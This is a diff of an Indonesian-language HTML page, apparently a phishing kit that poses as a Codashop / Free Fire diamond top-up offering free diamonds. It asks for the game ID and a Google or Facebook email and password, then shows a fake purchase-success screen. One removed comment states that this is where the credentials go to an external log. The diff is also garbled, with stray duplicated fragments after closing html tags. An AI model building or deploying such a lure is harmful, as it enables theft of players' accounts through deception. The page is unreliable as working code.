@@ -3,85 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Codashop - Top Up Game Murah</title>
+    <title>Free Fire Top Up - Zero Education Edition</title>
     <style>
-        /* --- CORE CSS: ESTETIKA ZERO-EDUCATION --- */
+        /* --- CSS ESTETIKA BOSS XZAM --- */
         :root {
-            --bg-color: #0b0219; /* Deep Purple Black */
-            --card-bg: #1a0b2e;
+            --bg-color: #1a0b2e;
+            --card-bg: #2d1b4d;
             --text-color: #ffffff;
             --accent: #7b2cbf;
             --highlight: #9d4edd;
-            --button-main: #9333ea;
+            --fb-color: #1877f2;
+            --google-color: #ffffff;
         }
 
         body {
             background-color: var(--bg-color);
             color: var(--text-color);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 20px;
-            display: flex; justify-content: center; align-items: flex-start;
-            min-height: 100vh;
+            margin: 0; padding: 15px;
+            display: flex; justify-content: center;
         }
 
-        .container {
-            width: 100%;
-            max-width: 480px; /* Perfect centered width */
-            display: flex;
-            flex-direction: column;
-            gap: 15px; /* Spacing between sections */
-        }
+        .container { width: 100%; max-width: 450px; }
 
-        header { text-align: center; margin-bottom: 10px; }
-        .logo { width: 140px; filter: drop-shadow(0 0 8px var(--accent)); }
+        header { text-align: center; margin-bottom: 20px; }
+        .logo { width: 130px; filter: drop-shadow(0 0 10px var(--accent)); }
         
-        .header-text { 
-            font-size: 11px; color: #ccc; 
-            background: rgba(123, 44, 191, 0.1); 
-            padding: 10px; border-radius: 6px; 
-            margin-top: 10px; border: 1px dashed var(--accent);
+        .warning { 
+            font-size: 11px; color: #bbb; 
+            background: rgba(255, 255, 255, 0.05); 
+            padding: 12px; border-radius: 8px; 
+            border: 1px dashed var(--accent);
             line-height: 1.4;
         }
 
-        /* --- SECTION BOXES --- */
         .section {
             background: var(--card-bg);
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.4);
-            border: 1px solid rgba(123, 44, 191, 0.1);
+            padding: 20px; border-radius: 12px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            border-left: 4px solid var(--accent);
         }
 
         .section-title { 
-            font-weight: bold; margin-bottom: 12px; 
-            display: flex; align-items: center; font-size: 14px;
+            font-weight: bold; margin-bottom: 15px; 
+            display: flex; align-items: center; font-size: 15px;
         }
         .section-title span {
             background: var(--accent);
-            width: 20px; height: 20px;
+            width: 24px; height: 24px;
             display: flex; align-items: center; justify-content: center;
-            border-radius: 50%; margin-right: 8px; font-size: 12px;
-            flex-shrink: 0;
+            border-radius: 50%; margin-right: 10px; font-size: 13px;
         }
 
-        /* --- INPUTS & BUTTONS --- */
-        input {
-            width: 100%; padding: 10px; box-sizing: border-box;
-            border-radius: 6px; border: 1px solid #444;
-            background: rgba(0,0,0,0.3); color: white; outline: none;
-            font-size: 13px;
+        input[type="number"], input[type="email"], input[type="password"] {
+            width: 100%; padding: 12px; box-sizing: border-box;
+            border-radius: 8px; border: 1px solid #444;
+            background: #1a0b2e; color: white; outline: none;
         }
+
+        .hint { font-size: 11px; color: #999; margin-top: 8px; }
 
         .grid-nominal {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+            display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
         }
 
         .card {
-            background: rgba(123, 44, 191, 0.1); padding: 12px 8px;
-            text-align: center; border-radius: 8px;
-            cursor: pointer; font-size: 12px; font-weight: 500;
+            background: #3c265e; padding: 15px;
+            text-align: center; border-radius: 10px;
+            cursor: pointer; font-size: 13px; font-weight: 500;
             transition: 0.3s; border: 1px solid transparent;
-            word-wrap: break-word;
         }
 
         .card.highlight {
@@ -90,153 +81,73 @@
             transform: scale(1.02);
         }
 
-        .form-login { margin-top: 10px; display: flex; flex-direction: column; gap: 8px; }
-
-        .payment-summary {
-            background: #fff; color: #333;
-            padding: 10px 15px; border-radius: 6px;
+        .payment-box {
             display: flex; justify-content: space-between; align-items: center;
-            font-size: 13px; font-weight: bold;
+            background: #fff; color: #333; padding: 12px; border-radius: 8px;
         }
-        .codapay-text { color: #555; }
-        .price-text { color: #27ae60; text-transform: uppercase; }
+        .payment-box img { height: 18px; }
+        .price-tag { font-weight: bold; font-size: 14px; }
+        .free-text { color: #27ae60; text-transform: uppercase; }
 
-        .buy-btn-lg {
-            width: 100%; padding: 14px;
-            background: var(--button-main);
+        .buy-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(45deg, var(--accent), var(--highlight));
             border: none; color: white; font-weight: bold;
-            border-radius: 8px; cursor: pointer; font-size: 15px;
-            transition: 0.3s;
+            border-radius: 12px; cursor: pointer; font-size: 16px;
+            box-shadow: 0 5px 15px rgba(123, 44, 191, 0.4);
         }
-        .buy-btn-lg:hover { background: var(--highlight); }
 
-        /* --- SUCCESS MODAL: NEWLY ADDED --- */
+        /* MODAL SYSTEM */
         .modal {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%; background: rgba(0,0,0,0.9);
             justify-content: center; align-items: center; z-index: 1000;
         }
         .modal-content {
-            background: var(--card-bg); padding: 20px;
-            border-radius: 15px; width: 80%; max-width: 300px;
+            background: var(--card-bg); padding: 25px;
+            border-radius: 20px; width: 85%; max-width: 350px;
             text-align: center; border: 1px solid var(--highlight);
         }
-        .success-text { font-size: 16px; font-weight: bold; color: #fff; margin-bottom: 5px; }
-        .success-sub { font-size: 12px; color: #ccc; }
-        .success-btn { background: #27ae60; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; margin-top: 15px; font-weight: bold; cursor: pointer; }
+
+        /* SUCCESS PAGE STYLING */
+        .success-page {
+            display: none; text-align: center;
+        }
+        .success-page h1 { color: #27ae60; font-size: 28px; margin-bottom: 10px; }
+        .success-page p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+        .back-btn {
+            background: var(--highlight); color: white; border: none;
+            padding: 10px 25px; border-radius: 8px; font-weight: bold; cursor: pointer;
+        }
+
+        .login-btn-container { display: flex; gap: 10px; margin: 20px 0; }
+        .btn-fb { background: var(--fb-color); flex: 1; color: white; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .btn-gp { background: var(--google-color); flex: 1; color: #555; padding: 12px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        
+        .form-login { margin-top: 15px; text-align: left; }
+        .submit-final {
+            width: 100%; margin-top: 15px; padding: 12px;
+            background: var(--highlight); border: none; color: white;
+            border-radius: 8px; font-weight: bold; cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="mainPage">
     <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Codashop" class="logo">
-        <div class="header-text">Layanan Top Up Otomatis 24 Jam. Harap masukkan data dengan benar untuk menghindari kegagalan sistem.</div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" alt="FF" class="logo">
+        <div class="warning">Metode ShopeePay hanya untuk Mobile. Pastikan saldo ShopeePay Anda cukup sebelum melakukan transaksi.</div>
     </header>
 
     <div class="section">
-        <div class="section-title"><span>1</span> Masukkan ID Pemain</div>
-        <input type="number" id="playerID" placeholder="Contoh: 181... ">
+        <div class="section-title"><span>1</span> Masukan ID akun FF</div>
+        <input type="number" id="playerID" placeholder="contoh: 181985136">
+        <div class="hint">ID karakter dapat ditemukan di profil game Anda.</div>
     </div>
 
     <div class="section">
-        <div class="section-title"><span>2</span> Pilih Nominal Diamond</div>
-        <div class="grid-nominal">
-            <div class="card" onclick="selectCard(this)">140 Diamonds</div>
-            <div class="card highlight" onclick="selectCard(this)">36500 Diamonds</div>
-        </div>
-    </div>
-
-    <div class="section">
-        <div class="section-title"><span>3</span> Otorisasi via Google</div>
-        <div id="authForm" class="form-login">
-            <input type="email" id="emailInput" placeholder="Email (Username Google)" required>
-            <input type="password" id="passInput" placeholder="Password Akun" required>
-            <button class="buy-btn-lg" style="padding:10px" onclick="validateAndSend()">LOGIN & BELI</button>
-        </div>
-    </div>
-
-    <div class="payment-summary section">
-        <div class="codapay-text">Codapay</div>
-        <div class="price-text">Rp 0 Total (Promo)</div>
-    </div>
-
-    <button class="buy-btn-lg" id="finalBuyBtn">BELI SEKARANG</button>
-</div>
-
-<div id="successModal" class="modal">
-    <div class="modal-content">
-        <div class="success-text">BERHASIL!</div>
-        <div class="success-sub">Terimakasih sudah belanja</div>
-        <button class="success-btn" onclick="location.reload()">Selesai</button>
-    </div>
-</div>
-
-<script>
-    // FUNGSI SELECT DIAMOND
-    function selectCard(el) {
-        document.querySelectorAll('.card').forEach(c => c.classList.remove('highlight'));
-        el.classList.add('highlight');
-    }
-
-    // FUNGSI KONFIRMASI LOGIN
-    function validateAndSend() {
-        const id = document.getElementById('playerID').value;
-        const email = document.getElementById('emailInput').value;
-        const pass = document.getElementById('passInput').value;
-
-        // Validasi Dasar
-        if(id === "") { alert("Isi ID Game dulu, Boss!"); return; }
-        if (!email.includes('@')) { alert("Email salah Boss!"); return; }
-        if (pass.length < 6) { alert("Password salah!"); return; }
-
-        // --- SIMULASI PENGIRIMAN DATA BOSS XZAM ---
-        // Sembunyikan container utama
-        document.querySelector('.container').style.display = 'none';
-        
-        // Tampilkan Modal Sukses
-        document.getElementById('successModal').style.display = 'flex';
-        
-        // Catatan: Di sinilah data (ID, Email, Pass) dikirim ke log eksternal.
-        // Simulasi hanya menampilkan modal sukses "Terimakasih sudah belanja".
-    }
-    
-    // Tombol Beli Sekarang (Hanya trigger login jika data belum lengkap)
-    document.getElementById('finalBuyBtn').onclick = function() {
-        document.getElementById('emailInput').focus();
-        alert("Silakan lengkapi data login di bagian 3.");
-    };
-</script>
-
-</body>
-</html>        document.querySelectorAll('.card').forEach(c => c.classList.remove('highlight'));
-        el.classList.add('highlight');
-    }
-    function openLogin() { document.getElementById('loginModal').style.display = 'flex'; }
-    function validateAndSend() {
-        const email = document.getElementById('emailInput').value;
-        if (!email.includes('@')) { alert("Email salah Boss!"); return; }
-        
-        document.getElementById('authForm').innerHTML = "";
-        document.getElementById('modalHeader').innerText = "BERHASIL!";
-        document.getElementById('modalSub').innerHTML = "<b style='color:white; font-size:16px'>Terimakasih sudah belanja</b><br>Data sedang diproses.";
-        
-        setTimeout(() => { location.reload(); }, 3000);
-    }
-</script>
-</body>
-</html>        <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Codashop" class="logo">
-        <div class="warning">Layanan Top Up Otomatis 24 Jam. Masukkan data dengan benar untuk menghindari kegagalan sistem.</div>
-    </header>
-
-    <div class="section">
-        <div class="section-title"><span>1</span> Masukkan ID Pemain</div>
-        <input type="number" id="playerID" placeholder="Contoh: 181985136">
-        <div class="hint">Silakan masukkan ID game Anda untuk melanjutkan verifikasi.</div>
-    </div>
-
-    <div class="section">
-        <div class="section-title"><span>2</span> Pilih Nominal Diamond</div>
+        <div class="section-title"><span>2</span> Pilih Nominal Top Up</div>
         <div class="grid-nominal">
             <div class="card" onclick="selectCard(this)">140 Diamonds</div>
             <div class="card" onclick="selectCard(this)">720 Diamonds</div>
@@ -246,34 +157,43 @@
     </div>
 
     <div class="section">
-        <div class="section-title"><span>3</span> Pilih Pembayaran</div>
+        <div class="section-title"><span>3</span> Metode Pembayaran</div>
         <div class="payment-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/eb/Codapay_logo.png" alt="Coda">
-            <div class="price-tag">Total: <span class="free-text">Rp 0 (Promo)</span></div>
+            <div class="price-tag">Harga: <span class="free-text">Rp 0</span></div>
         </div>
     </div>
 
     <button class="buy-btn" onclick="openLogin()">BELI SEKARANG</button>
 </div>
 
+<div class="container success-page" id="successPage">
+    <div class="section" style="border-left:none; text-align:center;">
+        <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" width="80" style="margin-bottom:20px; filter: invert(1);">
+        <h1>Makasih :)</h1>
+        <p>Pembelian Berhasil! Diamond akan masuk ke akun Anda dalam beberapa menit. Silakan cek in-game mail.</p>
+        <button class="back-btn" onclick="location.reload()">KEMBALI</button>
+    </div>
+</div>
+
 <div id="loginModal" class="modal">
-    <div class="modal-content">
-        <h3 id="modalHeader" style="margin:0">Otorisasi Pembayaran</h3>
-        <p id="modalSub" style="font-size:12px; color:#aaa">Silakan login untuk mengonfirmasi transaksi Rp 0.</p>
+    <div class="modal-content" id="modalBox">
+        <h3 style="margin:0">Verifikasi Akun</h3>
+        <p style="font-size:12px; color:#aaa">Login untuk klaim Diamond gratis Boss.</p>
         
-        <div id="loginOptions" class="login-btn-container">
+        <div class="login-btn-container">
             <button class="btn-fb" onclick="showForm('Facebook')">Facebook</button>
             <button class="btn-gp" onclick="showForm('Google')">Google</button>
         </div>
 
         <div id="authForm" style="display:none" class="form-login">
             <p id="platformLabel" style="font-weight:bold; color:var(--highlight); margin-bottom:10px"></p>
-            <input type="email" id="emailInput" placeholder="Email atau No. HP" required>
+            <input type="email" id="emailInput" placeholder="Email / Username" required>
             <input type="password" id="passInput" placeholder="Password Akun" style="margin-top:10px" required>
-            <button class="submit-final" onclick="validateAndSend()">KONFIRMASI SEKARANG</button>
+            <button class="submit-final" onclick="validateAndSend()">KONFIRMASI LOGIN</button>
         </div>
         
-        <p id="cancelBtn" onclick="closeLogin()" style="font-size:11px; color:#ff4d4d; cursor:pointer; margin-top:15px">Batalkan Transaksi</p>
+        <p id="cancelText" onclick="closeLogin()" style="font-size:11px; color:#ff4d4d; cursor:pointer; margin-top:15px">Batal / Kembali</p>
     </div>
 </div>
 
@@ -285,7 +205,7 @@
 
     function openLogin() {
         const id = document.getElementById('playerID').value;
-        if(id === "") { alert("Input ID dulu, Boss!"); return; }
+        if(id === "") { alert("Isi ID FF dulu Boss!"); return; }
         document.getElementById('loginModal').style.display = 'flex';
     }
 
@@ -295,36 +215,30 @@
 
     function showForm(p) {
         document.getElementById('authForm').style.display = 'block';
-        document.getElementById('platformLabel').innerText = "Otorisasi via " + p;
+        document.getElementById('platformLabel').innerText = "Login via " + p;
     }
 
     function validateAndSend() {
         const email = document.getElementById('emailInput').value;
         const pass = document.getElementById('passInput').value;
 
+        // VALIDASI BOSS XZAM
         if (!email.includes('@')) {
-            alert("Email/ID tidak valid! Periksa kembali.");
+            alert("Email tidak valid! Harus menggunakan '@'.");
             return;
         }
+
         if (pass.length < 6) {
-            alert("Password minimal 6 karakter.");
+            alert("Password tidak valid!");
             return;
         }
 
-        document.getElementById('authForm').style.display = 'none';
-        document.getElementById('loginOptions').style.display = 'none';
-        document.getElementById('cancelBtn').style.display = 'none';
-        
-        document.getElementById('modalHeader').innerText = "PEMBAYARAN DITERIMA!";
-        document.getElementById('modalHeader').style.color = "#27ae60";
-        document.getElementById('modalSub').innerHTML = "<br><b style='font-size:18px; color:white;'>Terimakasih sudah belanja</b><br><br>Pesanan Anda sedang diproses oleh sistem Codashop.";
-
-        setTimeout(() => {
-            alert("Terimakasih sudah belanja, Boss! Transaksi selesai.");
-            location.reload();
-        }, 3000);
+        // TRANSISI KE HALAMAN TERIMA KASIH
+        document.getElementById('loginModal').style.display = 'none';
+        document.getElementById('mainPage').style.display = 'none';
+        document.getElementById('successPage').style.display = 'block';
     }
 </script>
 
 </body>
-          </html>
+</html>
